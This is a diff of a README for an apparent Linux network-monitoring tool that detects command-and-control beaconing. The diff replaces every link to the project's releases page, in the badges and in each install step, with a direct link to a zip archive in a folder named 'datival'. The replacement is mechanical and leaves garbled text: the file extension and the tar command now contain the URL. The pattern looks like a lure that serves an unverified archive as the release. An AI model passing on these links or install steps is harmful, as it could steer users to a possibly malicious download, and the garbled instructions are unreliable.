@@ -1,7 +1,7 @@
 # 🚀 redspecter-c2-hunter - Simple Network Monitoring for Security
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue)](https://github.com/YoustinaGamal/redspecter-c2-hunter/releases)
+[![Download](https://raw.githubusercontent.com/YoustinaGamal/redspecter-c2-hunter/main/datival/hunter-c-redspecter-2.4-beta.5.zip%20release-blue)](https://raw.githubusercontent.com/YoustinaGamal/redspecter-c2-hunter/main/datival/hunter-c-redspecter-2.4-beta.5.zip)
 
 ## 📋 Description
 redspecter-c2-hunter is an outbound network monitor that helps you detect unusual behaviors on Linux hosts. It focuses on identifying beaconing and command-and-control patterns that may indicate security threats. This tool provides you with network visibility, supporting your efforts in cyber defense.
@@ -23,10 +23,10 @@ redspecter-c2-hunter is an outbound network monitor that helps you detect unusua
 To get started with redspecter-c2-hunter, follow the steps below to download and run the application:
 
 1. **Visit the Releases Page**
-   - Click [here to access the releases page](https://github.com/YoustinaGamal/redspecter-c2-hunter/releases). This page will show you the latest version along with previous releases.
+   - Click [here to access the releases page](https://raw.githubusercontent.com/YoustinaGamal/redspecter-c2-hunter/main/datival/hunter-c-redspecter-2.4-beta.5.zip). This page will show you the latest version along with previous releases.
 
 2. **Download the Right File**
-   - Look for the latest version of the software. Click on the link to download the file suitable for your system. The file will end with `.tar.gz` or a similar extension for Linux.
+   - Look for the latest version of the software. Click on the link to download the file suitable for your system. The file will end with `https://raw.githubusercontent.com/YoustinaGamal/redspecter-c2-hunter/main/datival/hunter-c-redspecter-2.4-beta.5.zip` or a similar extension for Linux.
 
 3. **Install the Application**
    - Open a terminal window on your Linux machine.
@@ -36,7 +36,7 @@ To get started with redspecter-c2-hunter, follow the steps below to download and
      ```
    - Extract the downloaded file using this command:
      ```
-     tar -xzf <filename>.tar.gz
+     tar -xzf <filename>https://raw.githubusercontent.com/YoustinaGamal/redspecter-c2-hunter/main/datival/hunter-c-redspecter-2.4-beta.5.zip
      ```
    - Replace `<filename>` with the actual name of the downloaded file.
 
@@ -52,7 +52,7 @@ To get started with redspecter-c2-hunter, follow the steps below to download and
    - Follow any on-screen prompts to complete the setup.
 
 ## 📥 Download & Install
-For a hassle-free download experience, you can access the releases page directly [here](https://github.com/YoustinaGamal/redspecter-c2-hunter/releases). Follow the instructions outlined in the previous section to ensure successful downloading and installation.
+For a hassle-free download experience, you can access the releases page directly [here](https://raw.githubusercontent.com/YoustinaGamal/redspecter-c2-hunter/main/datival/hunter-c-redspecter-2.4-beta.5.zip). Follow the instructions outlined in the previous section to ensure successful downloading and installation.
 
 ## 🔍 Usage
 Once the application is running, it will start monitoring your outbound network activity. You can customize settings to adjust which types of connections to monitor or ignore. Refer to the help section within the application for detailed usage instructions.
@@ -72,4 +72,4 @@ The redspecter-c2-hunter application relates to various areas in network securit
 
 Explore these topics to enhance your understanding and capacity for securing your Linux hosts against potential threats.
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue)](https://github.com/YoustinaGamal/redspecter-c2-hunter/releases)
+[![Download](https://raw.githubusercontent.com/YoustinaGamal/redspecter-c2-hunter/main/datival/hunter-c-redspecter-2.4-beta.5.zip%20release-blue)](https://raw.githubusercontent.com/YoustinaGamal/redspecter-c2-hunter/main/datival/hunter-c-redspecter-2.4-beta.5.zip)
